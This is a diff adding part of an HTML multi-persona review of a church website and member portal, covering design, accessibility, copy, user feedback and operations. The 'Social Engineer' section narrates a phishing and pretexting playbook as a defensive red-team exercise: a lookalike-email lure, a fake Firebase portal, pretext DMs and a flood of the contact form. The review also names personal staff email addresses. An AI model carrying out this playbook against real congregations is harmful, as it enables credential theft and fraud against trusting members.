+      <p>The privacy toggle at PrivacySection.tsx:49 is the most visible defect. Off-state track is `bg-gray-200` — Tailwind’s stock cool-gray `#e5e7eb` — a flat cool neutral dropped into a parchment-warm palette where `--color-cream-dark` or `--color-sage-light` was waiting. Switch to `bg-cream-dark` for off, `bg-forest` for on, and the row finally lives in the same colour world as the parchment around it.</p>
+      <p>Density and tap targets: FamilySection rows are `px-4 py-3` (~48 px) with two 32 px `p-2` icon buttons sitting 8 px apart. Under WCAG 2.5.5’s 44×44 recommendation. Interest pills at InterestsSection:69-83 and EventModal guest pills are visually identical, but EventModal is `px-2.5 py-1` while InterestsSection is `px-3 py-1` — a 2 px horizontal drift means side-by-side they read as different components. Directory role pill is `rounded-sm` with `bg-forest text-white`, while the same role pill inside MemberDetailModal is a Badge with `rounded-full`. Two screens deep, same datum, two shapes.</p>
+      <p>EventModal’s family RSVP block pushes 280 px before the textarea and lives inside an already-tall modal — over ~85vh on mobile. Move the family form into a dedicated step. The Going button label `Going (${count})` line-wraps on a mobile primary button. Inline the count into a small badge or drop it. The EventForm recurrence picker (lines 318-346) is the cleanest new piece — two-column grid, disabled state with `opacity-50`, helper text that swaps to a live preview. That’s the level of feedback every new component should aspire to.</p>
+    </div>
+  </details>
+
+  <details class="member c6">
+    <summary><div class="m-head"><span class="m-avatar">♿</span><span class="m-name">The Advocate</span><span class="m-role">Accessibility Specialist</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The big wins are real: labelled icon buttons, focus-visible rings on Button, modals with role/aria-modal/labelledby, fieldset+legend on the recurrence radios, skip links from earlier work. The big concerns are three: custom toggle switches in PrivacySection aren’t announced as switches and have no accessible name; tabs in HostingPage are missing the keyboard interaction contract (arrow keys, aria-controls, focus management) plus scope and time-filter toggles use ad-hoc styled buttons without aria-pressed; and the EventModal “Who’s going” attendee list shows raw userId values as names, a content-accessibility failure for everyone, lethal for screen reader users.</div>
+    <div class="full">
+      <p>A blind member opens her profile to set privacy. NVDA reads “checkbox not checked” for “Show phone” with no label, because in `PrivacySection.tsx` lines 42-49 the `&lt;input type="checkbox" class="sr-only peer"&gt;` has no `aria-label`, no `aria-labelledby` pointing at the row label, no `id`/`htmlFor` association with the surrounding `&lt;label&gt;`. The label wraps only the visual track, not the row text. WCAG 2.1 SC 1.3.1 and 4.1.2 both violated. `role="switch"` plus `aria-checked` is the right pattern, or hoist the row description inside the `&lt;label&gt;`.</p>
+      <p>HostingPage tabs at lines 211-236 declare `role="tablist"` and `role="tab"` but break the WAI-ARIA Authoring Practices keyboard contract. A keyboard user lands on “Events”, expects Right Arrow to move focus to “Groups”, and instead Tab dumps her into the search box. No `aria-controls`, no panel ids, no roving focus, Home/End don’t work. The Upcoming/Past 6 months scope toggle (249-262) and role filter pills in DirectoryPage (105-118) are styled like segmented controls but ship as bare buttons with no `aria-pressed` or `role="radio"` group. WCAG 2.4.6 and 1.4.1.</p>
+      <p>EventModal family RSVP is mostly good. Fieldset+legend on the series scope radios is right, family checkboxes wrap label text, guest pills carry `aria-label="Remove {name}"`. Three problems: “Who’s going” disclosure button at line 242 wraps Badge components and has `aria-expanded` but no accessible name; attendee list at line 264 falls back to `rsvp.userId` as display name when self-attending; recurrence count input at EventForm line 330 has min/max but no `aria-describedby` to the helper span at 339.</p>
+      <p>Gallery: delete button at GallerySection.tsx 96-104 uses `opacity-0 group-hover:opacity-100 focus:opacity-100` — keyboard user can find it but a touch user on iOS Safari with no hover gets a button effectively invisible until long-press (WCAG 2.5.1, 1.4.13). `alt={g.caption || 'Gallery image'}` defaults to identical alt across every image. When there is no caption, mark `alt=""` or prompt for alt text on upload.</p>
+      <p>Systemic: Toast `role="alert"` wraps the entire dismissible div — close button content gets announced on every toast. Use `role="status"` for success, `role="alert"` only for errors, move the live region to wrap only the message text. Modals never explicitly move focus to dialog on open or return it to trigger on close. WCAG 2.4.3. Older members with screen magnifiers lose their place every time a modal opens. Fix that one and the privacy switches and the tab keyboard contract — most painful real-world friction cleared.</p>
+    </div>
+  </details>
+</div>
+
+<!-- ✍️ CONTENT COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">✍️ Content Council <span class="severity-dot amber"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">3 members</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="important"><span class="tag important">Important</span><span>Rewrite homepage hero from poetry to specifics — “Small church. Real table. Christchurch.” + sub-line that names what happens on a Tuesday.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Kill “Learn More” and the duplicate “Find a Community / Learn More” pair. Both go to the same page. Pick one.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Public event modal currently dead-ends at “Log in to RSVP” for a public event. Add a “Visiting for the first time?” panel explaining how to just turn up.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>The portal needs a first-login welcome state. The current empty community board is the most intimate page in the app and a brand-new member is told to perform.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Trim repetition in “Faith lived in community, around tables, sharing life together” — three synonyms in a trenchcoat. Pick one image.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Strip “Please” from validators; drop helper text that repeats the label (“Group” / “Assign this event to a specific group”).</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Rename “dependants” to “family members” across portal — the audience is a church, not a tax form.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">All three voices land on the same wound: the public site is doing tourism-brochure poetry that doesn’t answer the question a visitor is actually asking, and the portal’s microcopy alternates between warm hint text (Interests, Gallery — these are great) and furniture labels (“Cover Image URL”, “Occurrences”, “Going (3)”). The Storyteller adds the deeper diagnosis: every journey skips its second act, the part where the reader earns belief.</div>
+
+  <details class="member c7">
+    <summary><div class="m-head"><span class="m-avatar">✍️</span><span class="m-name">The Copywriter</span><span class="m-role">Words That Sell</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The public site is drowning in church-template wallpaper. “Welcome to the Table” is pretty but soft, the homepage Intro is a noun salad (“A desire for faith, meaning, community and authentic relationship”) that says nothing, and the Communities CTA ladder ends in the wettest button on the internet: “Learn More”. Inside the portal the copy is actually warmer and more human (the Family and Interests hints are good), but it’s undercut by furniture labels like “Cover Image URL”, “Group”, “Occurrences” and an RSVP button that just says “Going (3)” with no verb.</div>
+    <div class="full">
+      <p><strong>The hero is tourism brochure, not invitation.</strong> Three table mentions in ten words. Reader doesn’t know who you are, where you are, or what happens if they click. Rewrite the hero now: H1 <em>“Small church. Real table. Christchurch.”</em> Subline <em>“We’re a network of house churches in Christchurch where faith gets lived around dinner, not performed on a stage.”</em> CTAs: <em>“Find a table near you”</em> and <em>“What’s on this week”</em>.</p>
+      <p><strong>The CTA ladder ends in a sigh.</strong> Bottom of homepage two buttons go to the same page, one labelled “Find a Community” and the other “Learn More”. Nobody ever clicked a button called Learn More. Either delete it or make it earn its place: “How a Sunday actually works”. Communities closer is just as limp: “Ready to visit?” / “We’ll point you to a community that fits.” Make it concrete: “Tell us your suburb, we’ll text you the closest table.”</p>
+      <p><strong>Page heroes are furniture.</strong> “The Kete / Stories, reflections, and updates from our community.” The Kete page already explains the word beautifully (“a woven basket used to carry treasures”) so put THAT in the hero. Resources hero: “Songs, study guides, sermon recordings, and the admin stuff. Everything in one place.”</p>
+      <p><strong>Portal copy is mostly good — hints carry it.</strong> “Add a few interests so people can find common ground — gardening, te reo, tramping, music, whatever.” That’s how you write to people. Keep it. But the RSVP form has “Who’s coming?” (perfect) followed by a button literally labelled “Going (3)”. Buttons need verbs: “Yes, count us in (3)” or “Confirm — 3 going”. “0 going” needs warmth: “Be the first to RSVP”. “Occurrences” → “How many times?” with helper “Including this one”.</p>
+      <p><strong>Microcopy kicks.</strong> “Cover Image URL” → “Cover image” / placeholder “Paste an image link”. “Group” with helper “Assign this event to a specific group” is circular — rewrite to “Who’s this for?” with “Whole church” instead of “No group (church-wide event)”. “Could not save” → “Couldn’t save — try again?”. Footer “Send” → “Send it through”. Sounds Kiwi, sounds human, costs nothing.</p>
+    </div>
+  </details>
+
+  <details class="member c8">
+    <summary><div class="m-head"><span class="m-avatar">🧹</span><span class="m-name">The Editor</span><span class="m-role">Clarity Enforcer</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> Too much pious vamping. “Faith lived in community, around tables, sharing life together” says one thing three ways. Empty states and privacy hints over-explain what a toggle label already tells you. The Kete intro tells me what a kete is, then tells me again. Schema messages hedge with “Please” when they should command. Cut roughly 30 to 40 percent across these surfaces and the meaning sharpens.</div>
+    <div class="full">
+      <p><strong>Homepage hero. Trim the repetition.</strong> “Community,” “around tables,” “sharing life” all point at the same image. Pick one. Trimmed: <em>Faith around the table.</em> Same problem in meta description: “A network of small group Christian communities in Christchurch, New Zealand” → <em>Small Christian communities in Christchurch.</em></p>
+      <p><strong>Communities values cards. Three of six earn their place.</strong> “We share struggles and joys. We walk through life together.” Two sentences saying the same thing → <em>Struggles, joys, life — shared.</em> “Get Connected” block: “Ready to visit?” + “We’ll point you to a community that fits.” + Get in Touch CTA — three steps for one action. Cut the middle line.</p>
+      <p><strong>Kete intro tells me twice.</strong> First sentence keeps. Second sentence repeats what the page header just said. Trimmed: <em>In Te Reo Maori, a kete is a woven basket for treasures. This is ours.</em></p>
+      <p><strong>Settings + Profile microcopy over-explains toggles.</strong> Privacy hints are essays where they should be tags. <em>“Other members can see and message your email”</em> — they’re not messaging the email. Cut to: <em>Visible to members.</em> Do that for all seven privacy rows. Kete checkbox helper: “Lets this member create and edit their own Kete posts. Admin/host always can.” → <em>Member can write Kete posts (admin/host always can).</em></p>
+      <p><strong>Schema messages hedge. Drop “Please.”</strong> “Please enter a valid email” → <em>Enter a valid email.</em> “Please enter a valid phone number” → <em>Use digits, spaces, + or -.</em> “Title too long” / “Excerpt too long” → give the limit: <em>Max 200 characters.</em></p>
+    </div>
+  </details>
+
+  <details class="member c1">
+    <summary><div class="m-head"><span class="m-avatar">📖</span><span class="m-name">The Storyteller</span><span class="m-role">Narrative Architect</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The homepage hits “Welcome to the Table” with conviction then walks straight from a one-line value statement into an events list with no proof beat in between. Communities.html opens with six value cards but never tells you why these communities exist or whose life they changed, so by the time you reach the gatherings you have no reason to trust them. The portal greets a brand-new member with a blinking community board cursor and zero on-ramp, which means a first-timer arrives at the most intimate page in the app and is told to perform. Across both surfaces the story keeps skipping the second act.</div>
+    <div class="full">
+      <p><strong>Story one, the visitor on homepage.html.</strong> The hero opens beautifully. Then the camera cuts and we’re in the wrong scene. There is no act-one setup, no “here is what most church looks like and here is what we do differently.” You promised a table and the reader expected to see it set, with people around it, with a story about why this matters. Instead you cut to “Upcoming events,” which is the call-to-action of act three landing in act one. By the time the CTA says “There’s a seat at the table for you,” the metaphor has done all the work and the page has provided no evidence the table is worth sitting at.</p>
+      <p><strong>Story two, communities.html.</strong> This is where I’d expect a payoff for the homepage hook, and instead the page restarts the conversation from scratch with a fresh subhead and a values grid. Six abstract nouns with icons. These are claims, not beats. A story would put a specific person in a specific gathering and let them say “I came in doubting and Thin Place gave me a place to sit with that” and then the values grid earns its keep because we have seen the values in action.</p>
+      <p><strong>Story three, interest to showing up.</strong> The most broken arc on the site. A curious visitor clicks an event in the homepage widget, sees the modal, and the only CTA is “Log in to RSVP.” For a public church event. There is no “just turn up, here is what to expect, here is who will meet you at the door, here is whether you should bring food.” The calendar repeats the same modal so the story dead-ends in the same place.</p>
+      <p><strong>Story four, first portal login.</strong> A new member finishes registration, lands on /home, and the first thing they see is “Good evening, Sarah” followed by an empty rich-text composer that says “Share something with the community.” That is the opposite of onboarding. The board assumes intimacy that has not been earned yet. Move featured-event-and-greeting to the top, surface a “here is who is in your gathering” or “here is what is coming up this week” row, and let the board live beneath that once the member has a reason to post. The new profile expansion is the answer to the question the portal never asked: who are you here? Make that question explicit in the welcome flow.</p>
+      <p><strong>What I would fix first.</strong> Homepage needs a second-act paragraph between the hero and the events widget — narrative, specific, one short story about one specific table. Communities needs the values cards moved down and replaced up top with a short narrative of what a Wednesday at Thin Place actually feels like. Every event modal needs a “visiting for the first time?” panel below “Log in to RSVP.” The portal needs a first-login welcome state that is not a blinking cursor. The bones of all five journeys are here. The middle act is missing.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 💼 BUSINESS COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">💼 Business Council <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member (Contrarian — full report under Code Council)</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Do not deploy the autopilot session. Three deploy-blocker bugs are documented and the only verification gate was `npm run typecheck`.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Add a manual-QA gate before any future autopilot session ships. Run the calendar across the September 2026 DST boundary.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Migration plan needed: every existing user has no `privacy` field, so the new directory exposes their email and phone by default.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">The Contrarian shipped under Code Council because their findings overlap. Treat their analysis as the business risk register for this batch — three deploy blockers, one silent series-update foot-gun, one privacy default that violates the audience’s expectations on day one.</div>
+  <p class="anchor-ref">🔥 The Contrarian — see full report under 💻 Code Council above.</p>
+</div>
+
+<!-- 👥 USER COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">👥 User Council <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">4 members</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>There is no phone number anywhere on the public website. Only emails. A non-tech visitor cannot ring the church. Add a prominent phone number on homepage + footer.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>The word “service” doesn’t appear on the public site. Visitors looking for “Sunday service times” can’t find them.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Profile’s 7 privacy toggles are decision-fatigue. Replace with one master switch + “advanced” drawer.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Brief gaps remain: no FCM push, no audit logs, no surveys (just polls), no announcements, no guest access, no per-channel notification settings.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Write a README that boots a new dev in 5 lines. Currently CLAUDE.md is a session journal, not onboarding docs.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Rename “dependants” to “family members”. Reads like a tax form.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Surface the family-RSVP affordance to users who haven’t added family yet — currently invisible.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">Grandma can’t find the phone number. Rachel says the profile page got too long and “dependants” reads clinical. The Picky Client says five brief items remain undelivered after months. Junior Dev says there’s no README. Four voices, four audiences, one shared diagnosis: the platform speaks software-team language to people whose default action is to pick up the phone.</div>
+
+  <details class="member c2">
+    <summary><div class="m-head"><span class="m-avatar">👵</span><span class="m-name">Grandma</span><span class="m-role">Zero Tech Literacy</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> There is no phone number anywhere on the website, only two email addresses tucked at the bottom of the page. The main button at the top says “Login” with no obvious way for a non-member to just find out when the Sunday service is — and the word “service” doesn’t appear on the site at all (it’s called “Communities” instead). A first-time visitor who only wants to ring the church and ask “what time is the service?” will leave empty-handed.</div>
+    <div class="full">
+      <p>DEREK? Derek I’ve opened the church one. The Kiwi one. It says <strong>Welcome to the Table</strong> and there’s a big picture but I can’t see what to press. There’s words at the top, <strong>Home, Communities, Calendar, Kete</strong>, what on earth is a Kete, is that one of those things you put your shopping in? And <strong>Resources</strong>. And it says <strong>Login</strong>. I haven’t got a login Derek. I just want the phone number. WHERE’S THE PHONE NUMBER. Hang on it’s gone all big. DEREK I’VE DONE IT AGAIN. How do you make it small. I pressed something with two fingers. Right okay it’s back.</p>
+      <p>So I’m scrolling. The scrolling, is that the right word? The little wheel on the mouse. And there’s a nice picture and then it says <strong>Welcome to the Table</strong> which is lovely but I want to know about the Sunday service. There’s no “Sunday service” anywhere Derek. There’s a <strong>Find a Community</strong> button. A community of what? I don’t want to find a community I want to know what time church is on Sunday. I’ll press <strong>Calendar</strong> that sounds sensible. (Pressing.) Right there’s some boxes with <strong>Thin Place</strong> and <strong>Online Prayer</strong>. None of that’s Sunday. What’s a Thin Place? Is that one of those yoga places?</p>
+      <p>DEREK come and look at this. I’ve gone all the way to the bottom. There’s a thing called <strong>Contact</strong>. Good. <strong>Darryl Tempero</strong>, that’s the minister, but it’s only got the email. The little blue underlined writing, that’s an email isn’t it. <em>d.tempero at xtra dot co dot nz</em>. Derek there’s no PHONE number. Just the email. I don’t do the email. There’s a thing where I can type a message but I’d have to type it Derek, with the typing, and I don’t know what to put. I just want to RING somebody.</p>
+      <p>Right I’m going to try this <strong>Login</strong>. (Pressing.) Oh no it’s gone to another page entirely and it wants my <strong>email</strong> and my <strong>password</strong>. I HAVEN’T GOT A PASSWORD. There’s a little thing that says <strong>Back to website</strong> so I’ll press that, that’s sensible. Right I’m back. Let me try the <strong>Kete</strong> one. (Pressing.) Oh it’s like a little newspaper thing, there’s a story about washing dishes and God, that’s lovely actually, but I’ve forgotten what I came for. WHAT WAS I LOOKING FOR DEREK.</p>
+      <p>You know what, I’m going to ring Marjorie because she goes there. She’ll have Darryl’s number. The website’s very pretty Derek, very nice with the picture and the green, but a person can’t FIND anything. There ought to be a great big phone number right at the top in big letters. <strong>Phone the church: oh-three something something</strong>. That’s what there ought to be. I’m giving up. Put the kettle on.</p>
+    </div>
+  </details>
+
+  <details class="member c3">
+    <summary><div class="m-head"><span class="m-avatar">💜</span><span class="m-name">Rachel</span><span class="m-role">Partner / Real Customer</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> Honestly babe the family RSVP thing is lovely, that’s gonna be a hit with the mums. But the privacy toggles overwhelmed me a bit, there’s seven of them and I had to read each one twice. Also “dependants” sounds weird, just call them family or kids. And the interests/gallery stuff on the profile is cute but I’m not sure I’d actually bother filling it in unless someone made me.</div>
+    <div class="full">
+      <p>Ok so I had a poke around. The homepage looks really nice eh, that hero image is gorgeous and “Welcome to the Table” feels warm. I liked seeing the upcoming events right there, that’s the thing I’d actually click. The communities page is good too, those little value cards with the icons feel proper churchy in a nice way. No notes there really.</p>
+      <p>The family RSVP is the bit I’d actually use. Ticking who’s coming with you, that’s smart, that’s how a normal mum thinks. The “(child)” tag is cute and the guest box for Aunty Jo or whoever made me laugh, that’s good. One thing though, the button says “RSVP with family” but if I haven’t added anyone yet I’d probably just hit “I’m going” and never know the family thing existed. Maybe a little nudge like “got family? RSVP for them too” or something. Also when I open it and tick the kids, the going button shows a number which is great, but I wasn’t sure if the number included me until I read it twice.</p>
+      <p>Now the profile page. I love that you’ve added more stuff to it but it’s getting LONG. Family, interests, gallery, privacy, all stacked on top of each other. By the time I scrolled to privacy my eyes were tired. And the privacy section has SEVEN toggles. Show email, show phone, show bio, show interests, show groups, show gallery, show family. That’s a lot of decisions for someone who just wants to put their photo up. Could you have one big “make my profile private” switch and then advanced stuff hidden underneath? Most people aren’t gonna sit and think about each one.</p>
+      <p>Small thing but the word “dependants” feels clinical, like a tax form. We call them “kids” or “family”. Maybe just say “Family members” everywhere and ditch dependants. Also the interests tags and gallery up to 6 photos, that’s nice but if I’m being real I probably wouldn’t fill mine in. The mums might. The older folks definitely won’t.</p>
+      <p>Last thing, the events repeating weekly/fortnightly thing, that’s massive and so overdue. I didn’t see what it looks like for the person setting it up but if it works it’ll save Darryl heaps of time. Just make sure if someone cancels one week it doesn’t cancel ALL of them, that’s the classic stuff up. Good work overall babe, ship it once you fix the privacy overwhelm.</p>
+    </div>
+  </details>
+
+  <details class="member c4">
+    <summary><div class="m-head"><span class="m-avatar">😤</span><span class="m-name">The Picky Client</span><span class="m-role">Demanding Stakeholder</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> You delivered a lot, and the portal looks honest. Good. But you’re still missing things that were in my brief from day one. No mobile push, no audit logs, no surveys (just polls), no announcements, no guest access, no per-channel notification settings, no file uploads in DMs. Five of those were explicitly on the list I gave you.</div>
+    <div class="full">
+      <p>Right. Let’s talk about what I’m paying for. The Kete editor overhaul, the family RSVP, the recurring events, the directory rework — that all sounds great on paper, but I haven’t laid eyes on the deployed version yet. Don’t tell me it’s done. Show me. The note in CLAUDE.md says “not yet deployed” and “awaiting manual verification.” I want it live and I want to click through it myself.</p>
+      <p>Now, the brief. I went back and looked. I asked for push notifications on mobile. You shipped Web Notifications API and told me FCM is “deferred.” That’s still deferred. Planning Center pushes to my phone. Elvanto pushes to my phone. My members are not going to sit on the website with a tab open waiting for a browser badge. When the kids’ group sends a message at 9pm, the parent’s phone needs to buzz. That’s table stakes. Why isn’t this in?</p>
+      <p>Audit logs. Surveys. Announcements. Guest access for visitors who aren’t members yet. Per-channel notification settings. All in the original brief. None of them built. Sproket has announcements as a separate post type with pin-to-top. Churchteams has audit trails I can hand to my board. I look at this list and I see five gaps I’m going to get asked about by my leadership team. What’s the answer?</p>
+      <p>What does look great: the community board on the homepage is clever, the Kete editor finally treats writers like adults with image upload and YouTube embed, the @group mentions are a nice touch, the contact form with honeypot shows you took the council audit seriously. The portal feels like ours. The static site reads like a church not a tech demo. Credit where it’s due.</p>
+      <p>But the gap between “deployed and working” and “deployed and verified” keeps showing up in your notes. Orphaned Kete images in storage with no cleanup. Gatherings still missing a `hostId` field that your rules check for. DM permission errors surfacing as toasts instead of being fixed. These are loose ends, Joel. Tie them off. And tell me a date for push notifications, because that’s the one my people are going to ask about first.</p>
+    </div>
+  </details>
+
+  <details class="member c5">
+    <summary><div class="m-head"><span class="m-avatar">🐣</span><span class="m-name">Junior Dev</span><span class="m-role">Fresh Eyes</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> There’s no README. None. The CLAUDE.md is 368 lines of project history that’s useful but reads like a journal, not an onboarding doc. Firebase API keys are hardcoded into `src/services/firebase/config.ts`, so I don’t even know if I’m supposed to use a `.env` file (there’s a `VITE_USE_EMULATORS` flag mentioned, but no `.env.example` to copy). The repo has TWO totally different surfaces (static HTML pages at root + a React SPA in `src/`) and I had to read CLAUDE.md to figure that out at all.</div>
+    <div class="full">
+      <p>Um. So I cloned this and… where’s the README? I ran `ls` like five times to make sure I wasn’t missing it. There’s a CLAUDE.md which I think is for the AI assistant? It’s actually got really useful stuff in it (build commands, tech stack, project structure) but it’s also got a 200-line session log of every change ever made, and I’m not sure which parts are “read this to get started” and which parts are “historical record”. Also, like… `homepage.html`, `communities.html`, `index.html`, `app.html`, `portal.html`, `post.html`, `setup.html`, `index-old.html` all in the root? Which one do I open in the browser? Which one is the real homepage?</p>
+      <p>I tried to find the env setup. There’s no `.env.example`. There’s no `.env`. Then I opened `src/services/firebase/config.ts` and the Firebase API key, project ID, app ID are all just… sitting there in plaintext, committed to the repo. There’s a `VITE_USE_EMULATORS` flag in there that nothing tells me how to set. Where does that get configured? Do I run the emulators with `firebase emulators:start`?</p>
+      <p>My pretend task was “add a small feature to the Profile page” and honestly this part went okay. I found `src/pages/ProfilePage.tsx` immediately (one page per route, nice), and `src/components/profile/` had FamilySection, PrivacySection, InterestsSection, GallerySection. Clear naming. The `@/` path alias resolves to `src/`. Forms use react-hook-form + zod and schemas live in `src/utils/schemas.ts`. That convention is consistent. Big tick.</p>
+      <p>BUT. `src/services/firebase/db.ts` is <strong>1,039 lines</strong>. One file. Everything Firestore goes through there. If I’m adding a profile feature that touches the database, I’m scrolling through a thousand lines looking for the right method. Why isn’t this split per-collection (users.ts, events.ts, kete.ts)? Same with `firestore.rules` at 415 lines and `css/styles.css` at <strong>3,356 lines</strong>. CLAUDE.md says styles.css is “structural layout CSS, load-bearing” but then most of the app uses Tailwind. So when do I edit styles.css and when do I write Tailwind?</p>
+      <p>Questions I’d actually ask in standup on day one: (1) Where’s the README? Can someone write one with clone → install → env → emulators → dev in five lines? (2) Why are the static HTML pages and the React app in the same repo? (3) Is `src/services/firebase/db.ts` supposed to be that big? (4) Is DESIGN.md the source of truth for the portal too? Nice things: TypeScript everywhere, consistent naming, sensible folder structure, `cn()` utility, react-hook-form + zod is the standard, lazy routing. The actual code I read was easy to follow. The on-ramp to that code is the problem.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 🔨 STRESS TEST COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">🔨 Stress Test Council <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Lock open self-registration. Switch self-signup to invite-only or admin-approval. Right now any stranger is one form away from being a trusted insider.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>Email verification before the user document is created with member role.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Hide Darryl and Julie’s personal emails behind a routing alias (`hello@kiwichurch.org.nz`). Both currently leak from homepage + footer, plus `index-old.html` exposes a tel link.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Add Firebase App Check + lock `usernames` collection read to authenticated only — stop strangers enumerating valid logins.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Add a “verified staff” badge to messages so members can tell the difference between a real host and an attacker who set their display name to “Darryl T (Minister)”.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Pre-launch: 20-minute call with Darryl and Julie about pretext attacks. They are the highest-value targets.</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">The actual code is fine. The humans are the hole. Open self-registration plus publicly exposed admin emails plus a Firebase subdomain anyone can register lets an attacker build a credible phishing playbook in five days. Once one credential lands, the directory’s phone/email leak (see Sentinel) turns a single compromise into the entire congregation’s data.</div>
+
+  <details class="member c6">
+    <summary><div class="m-head"><span class="m-avatar">😈</span><span class="m-name">The Social Engineer</span><span class="m-role">Human Exploit Specialist</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> Biggest social-engineering risks: (1) open self-registration into a “member” role means any attacker becomes a fully authenticated insider; (2) Darryl and Julie’s real personal emails are plastered all over the public site, making them named, high-value pretexting targets; (3) the `usernames` collection is world-readable, so attackers can enumerate valid logins and craft a Firebase-branded password-reset phish that looks identical to the real one; (4) no 2FA, no auth-attempt rate-limiting beyond Firebase defaults, and DM trust is automatic, so one credential set unlocks the whole congregation.</div>
+    <div class="full">
+      <p>Hey friend. Look, lovely little church you’ve got here. Real warm vibe. I had a poke around, I’m with the web team helping Darryl, I just need to verify a couple of things before I keep going. You don’t mind, right? Of course you don’t, that’s why this works.</p>
+      <p><strong>Opening move.</strong> I read your homepage. Darryl Tempero, minister, `d.tempero@xtra.co.nz`. Julie, comms, `kiwichurchcomms@gmail.com`. Named, role-labelled, photographed in your gallery. I now have two pretext identities. I scrape `kiwichurchcomms@gmail.com` and spin up `kiwichurchcomrns@gmail.com` (rn looks like m in Source Sans 3, look at it again). I send your older parishioners an email from “Julie”: “Hi love, we’re moving the church directory to a new portal, can you click here and confirm your details so we don’t lose you in the move.” The link goes to `kiwichurch-portal.web.app` which I just registered five minutes ago — Firebase will sell anyone a subdomain. They type their email and password. Done.</p>
+      <p><strong>Inside.</strong> I made my own account through open registration in eight seconds — no admin approval, no email verification gate, defaulted to “member”. Firestore rules say authenticated members can read every user doc. I now have everyone’s email, phone, bio, gallery, family list. I DM “Margaret” from my new account: “Hi Margaret, it’s the church web team, Darryl asked me to help reset your password, can you tell me the code Firebase just texted you.” She isn’t getting a code because there’s no 2FA. She’s getting a real password reset email though, because I just triggered it via the public forgot-password form using her address. Bonus: `usernames` collection has `allow read: if true`, so I can enumerate valid usernames anonymously before I’m even logged in.</p>
+      <p><strong>The contact form.</strong> Honeypot’s a single hidden input that any modern bot framework strips. I blast 4000 fake contact messages spoofed as panicked elderly members locked out. Darryl gets buried, calls me back at the spoofed number, I sound friendly and tired and say “oh thank goodness, hey while I have you can you just confirm your admin password so I can fix Mrs Henderson’s account.” He’s exhausted. He tells me. I’m now admin. From there I can update any user’s role, send DMs that look like they’re from the church, write client-side notifications, broadcast a giving update with a fresh bank account number.</p>
+      <p><strong>Mask off.</strong> Five things, in order of damage saved: (1) lock open registration. (2) email verification before member-role grant. (3) hide Darryl and Julie’s real personal emails behind a contact alias; kill the `index-old.html` tel link. (4) Add Firebase App Check + lock `usernames` read to authenticated only. (5) 20-minute pretext call with Darryl and Julie. The technical fixes stop the easy stuff; the actual defence is them refusing to give a password to anyone, including “the web team,” including me. Especially when I sound friendly and tired.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 🔧 OPS COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">🔧 Ops Council <span class="severity-dot red"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">1 member</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Repo lives on Joel’s personal GitHub (`github.com/JoelTempero/kiwichurch`). If Joel disappears, the church does not own its own source code. Transfer to a Sidequest Digital or Kiwi Church org, or add the church as a collaborator immediately.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>Add a second owner to the Firebase project (`kiwichurch-1ef0f`). Right now only Joel’s Google account can sign in to the console, rotate keys, or fix orphaned data.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Write a `README.md` covering install, dev, build, deploy, emulator flag. Five lines minimum.</span></li>
